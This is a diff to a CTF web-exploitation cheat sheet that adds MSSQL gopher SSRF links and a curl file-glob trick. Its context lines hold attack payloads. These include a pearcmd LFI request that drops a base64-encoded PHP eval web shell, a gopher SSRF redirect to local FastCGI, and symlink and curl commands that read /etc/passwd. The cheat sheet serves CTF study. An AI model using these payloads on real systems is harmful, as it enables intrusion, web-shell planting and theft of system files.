@@ -2077,7 +2077,7 @@ HQL injection example (pwn2win 2017)
     - `/?+svntag+/tmp/;echo${IFS}PD9waHAgZXZhbCgkX1BPU1RbMF0pOyA/Pg==%7Cbase64${IFS}-d>/tmp/hello-0daysober.php;/Archive_Tar+&file=/usr/local/lib/php/pearcmd.php&`
 - Example
     - [Balsn CTF 2021 - 2linephp](https://github.com/w181496/My-CTF-Challenges/tree/master/Balsn-CTF-2021#2linephp)
-    - [巅峰极客2020 - MeowWorld](https://github.com/w181496/My-CTF-Challenges/tree/master/geekctf-2020)
+    - [巅峰极客2020 - MeowWorld](https://www.anquanke.com/post/id/218977#h2-3)
 
 
 ## data://
@@ -2808,7 +2808,11 @@ header( "Location: gopher://127.0.0.1:9000/x%01%01Zh%00%08%00%00%00%01%00%00%00%
             - Command Phase
         - `gopher://127.0.0.1:3306/_<PAYLOAD>`
         - Tool: https://github.com/undefinedd/extract0r-
-
+    - MSSQL
+        - Example
+            - [35c3 - post](https://ctftime.org/writeup/12808)
+            - [N1CTF 2021 - Funny_web](https://harold.kim/blog/2021/11/n1ctf-writeup/)
+        - Tool: https://github.com/hack2fun/gopher_attack_mssql
     - Tomcat
         - 透過 tomcat manager 部署 war
         - 要先有帳密，可以從 `tomcat-users.xml` 讀，或是踹預設密碼
@@ -3945,6 +3949,11 @@ state[i] = state[i-3] + state[i-31]`
 - Symlink
     - `ln -s ../../../../../../etc/passwd kaibro.link`
     - `zip --symlink bad.zip kaibro.link`
+
+- curl trick
+    - `curl 'fi[k-m]e:///etc/passwd`
+    - `curl '{asd,bb}'`
+    - Example: [N1CTF 2021 - Funny_web](https://vuln.live/blog/16)
 
 - tcpdump
     - `-i` 指定網卡，不指定則監控所有網卡
